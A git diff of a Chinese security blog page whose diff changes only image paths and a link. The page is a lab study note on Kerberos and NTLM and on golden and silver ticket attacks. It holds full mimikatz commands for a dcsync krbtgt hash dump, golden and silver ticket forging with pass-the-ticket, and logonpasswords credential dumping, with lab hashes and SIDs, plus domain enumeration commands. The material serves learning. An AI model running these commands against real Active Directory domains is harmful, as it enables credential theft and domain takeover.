@@ -91,7 +91,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/common/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -352,15 +352,15 @@
                 <meta name="referrer" content="no-referrer">
 
 <h1 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h1><p>《信息系统安全概论》书中对kerberos协议流程做了简化，如下所示</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/78830c3325ff47609aa89438394a6a48.png" srcset="/img/loading.gif" lazyload alt="a"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/78830c3325ff47609aa89438394a6a48.png" srcset="/img/common/loading.gif" lazyload alt="a"></p>
 <p>在此用下图做说明</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/40ba09433074479797c76a0f82c6d933.png" srcset="/img/loading.gif" lazyload alt="a"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/40ba09433074479797c76a0f82c6d933.png" srcset="/img/common/loading.gif" lazyload alt="a"></p>
 <p><strong>KDC</strong>(密钥分发中心)包含身份认证服务器和服务审批服务器(用于票据授权服务<strong>TGS</strong>)</p>
 <p><strong>DC</strong>是域控制器；<strong>AD</strong>是活动目录。<br>DC中有一个特殊用户叫做:<strong>krbtgt</strong>,它是一个无法登录的账户,是在创建域时系统自动创建的,在整个kerberos认证中会多次用到它的Hash值去做验证。<br>AD会维护一个Account Database(账户数据库). 它存储了域中所有用户的密码Hash和白名单。只有账户密码都在白名单中的Client才能申请到<strong>TGT</strong>(票据分发票据)。</p>
 <p>目前Kerberos认证协议还添加了客户端认证服务端身份的步骤，这里暂时不做记录。</p>
 <p>要注意的是，身份认证服务器和服务审批服务器发送给客户端的[Tgrant]Kgrant即TGT就是用krbtgt的NTLM密码hash加密的数据。</p>
 <h1 id="NTLM认证协议"><a href="#NTLM认证协议" class="headerlink" title="NTLM认证协议"></a>NTLM认证协议</h1><p>NTLM验证是一种Challenge&#x2F;Response 验证机制，由三种消息组成:通常称为type 1(协商)，类型type 2(质询)和type 3(身份验证)。</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/23fa9b3b5f4d4bd68d8191d6fe09236a.png" srcset="/img/loading.gif" lazyload alt="x"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/23fa9b3b5f4d4bd68d8191d6fe09236a.png" srcset="/img/common/loading.gif" lazyload alt="x"></p>
 <p>1.（交互式登录到某客户机）用户使用：域名、用户名、密码，登陆到某台客户端。客户端计算并存储用户密码的加密散列值（Hash），然后将真实的密码丢掉（即不保存用户真实的密码）</p>
 <p>2.客户端将用户名以纯文本的方式发送到要访问的服务器</p>
 <p>3.服务器产生一个 16 字节的随机数并将该随机数发送给客户端，该随机数通常称为：挑战（Challenge）</p>
@@ -385,27 +385,27 @@
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mimikatz <span class="hljs-built_in">log</span> <span class="hljs-string">&quot;lsadump::dcsync /domain:vulntarget.com /user:krbtgt&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>域控上的hash值<code>a3dd8e4a352b346f110b587e1d1d1936</code></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/3a5d8e387ee244578c028459202156af.png" srcset="/img/loading.gif" lazyload alt="image-20220318093907990"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/3a5d8e387ee244578c028459202156af.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318093907990"></p>
 <p>域控上的SID<code>S-1-5-21-3795598892-1521228294-2653055093-502</code></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/b3ce1f744e0a4c27bb38cf7016000d8d.png" srcset="/img/loading.gif" lazyload alt="image-20220318093945235">到<code>域成员</code>上用的cmd窗口</p>
+<p><img src="https://img-blog.csdnimg.cn/direct/b3ce1f744e0a4c27bb38cf7016000d8d.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318093945235">到<code>域成员</code>上用的cmd窗口</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">进入mimikatz<br>mimikatz<br><br>清空票据<br>kerberos::purge<br><br>查看是否清空<br>kerberos::list<br><br>然后退出<br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
 
 <p>运行一下命令，<strong>注意要去掉最后的一部分502</strong>，这里伪造Administrator用户身份</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz <span class="hljs-string">&quot;kerberos::golden /user:Administrator /domain:vulntarget.com /sid:S-1-5-21-3795598892-1521228294-2653055093 /krbtgt:a3dd8e4a352b346f110b587e1d1d1936 /ptt&quot;</span> <span class="hljs-keyword">exit</span><br><br>Administrator:	当前域用户名称<br>vulntarget.com:	域名<br>ptt:	不导出票据文件，直接保存在内存里<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/c4fa85dcc054479384fd8cbe325c3ee3.png" srcset="/img/loading.gif" lazyload alt="image-20220318094251987"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/c4fa85dcc054479384fd8cbe325c3ee3.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318094251987"></p>
 <p>再次查看list</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/d051c3f535714a2da3a64290b593718b.png" srcset="/img/loading.gif" lazyload alt="image-20220318094314657"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/d051c3f535714a2da3a64290b593718b.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318094314657"></p>
 <p>执行只有Administrator才有权限的命令，导出域内krbtgt用户的账号密码</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz<br><br>lsadump::dcsync <span class="hljs-regexp">/domain:vulntarget.com /u</span>ser:krbtgt<br><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
 
 <p>成功执行。</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/26c08b9d28ee441da389f57e57bbc87a.png" srcset="/img/loading.gif" lazyload alt="image-20220318094441173"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/26c08b9d28ee441da389f57e57bbc87a.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318094441173"></p>
 <p>在清空一下黄金票据</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz<br><br>kerberos::purge<br></code></pre></td></tr></table></figure>
 
 <p>再运行相同的命令<code>lsadump::dcsync /domain:jgc.com /user:krbtgt</code>，发现失败了。</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/aec6757b75e14f89b126aff9c3bf341d.png" srcset="/img/loading.gif" lazyload alt="image-20220318100303944"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/aec6757b75e14f89b126aff9c3bf341d.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318100303944"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">获取域用户列表		net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span><br>获取域管理员里列表	net <span class="hljs-keyword">group</span> &quot;domain admins&quot; /<span class="hljs-keyword">domain</span><br>查看域控制器		net <span class="hljs-keyword">group</span> &quot;domain controllers&quot; /<span class="hljs-keyword">domain</span><br>查看域机器		net <span class="hljs-keyword">group</span> &quot;domain computers&quot; /<span class="hljs-keyword">domain</span><br></code></pre></td></tr></table></figure>
 
 <h1 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>kerberos最后，客户端带着ST和[Qserver]Ksess-2，服务端用自己的保存的一个key(Kserv)来解密ST，从而获得Ksess-2，进而验证客户端身份。</p>
@@ -419,13 +419,13 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
 
 <p>查看域控信息</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/9aefe8b293174f5ca4d25c4d63e61903.png" srcset="/img/loading.gif" lazyload alt="image-20220318102309825"></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/caf79c038d574b3ba9fc2dbb94a4fe4e.png" srcset="/img/loading.gif" lazyload alt="image-20220318102249229"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/9aefe8b293174f5ca4d25c4d63e61903.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318102309825"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/caf79c038d574b3ba9fc2dbb94a4fe4e.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318102249229"></p>
 <p>到客户端伪造服务权限</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz <span class="hljs-string">&quot;kerberos::golden /domain:vulntarget.com /sid:S-1-5-21-3795598892-1521228294-2653055093 /target:win2019.vulntarget.com /service:cifs /rc4:9b43daec0127dfa40d3707f4d46d60b6 /user:win2016 /ptt&quot;</span> <span class="hljs-keyword">exit</span><br><br>win2019.vulntarget.com:	域中访问服务器的计算机全名<br>cifs:	一个远程访问的协议服务<br>jgc:	客户端在域中的名字<br></code></pre></td></tr></table></figure>
 
 <p>可以看到本机有了在域控中的访问权限</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/2da87317d01e470b85a448b5590951c9.png" srcset="/img/loading.gif" lazyload alt="image-20220318102859031"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/2da87317d01e470b85a448b5590951c9.png" srcset="/img/common/loading.gif" lazyload alt="image-20220318102859031"></p>
 <p>如果清空票据后，权限就没有了</p>
 <h1 id="黄金票据和白银票据区别"><a href="#黄金票据和白银票据区别" class="headerlink" title="黄金票据和白银票据区别"></a>黄金票据和白银票据区别</h1><p>黄金票据是在绕过和身份认证服务器的交互，但是和服务审批服务器交互，即会同KDC交互，伪造域中的其他用户，如果伪造了Administrator用户，就有很高的权限。</p>
 <p>白银票据是绕过了和KDC的交互，直接伪造本地用户能访问指定的用户，如cifs。</p>
@@ -549,8 +549,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/05/06/Learn/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B9%8BPython%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马学习之Python内存马">
-                        <span class="hidden-mobile">内存马学习之Python内存马</span>
+                      <a href="/2022/05/06/Learn/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B9%8BPHP%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马学习之php内存马">
+                        <span class="hidden-mobile">内存马学习之php内存马</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
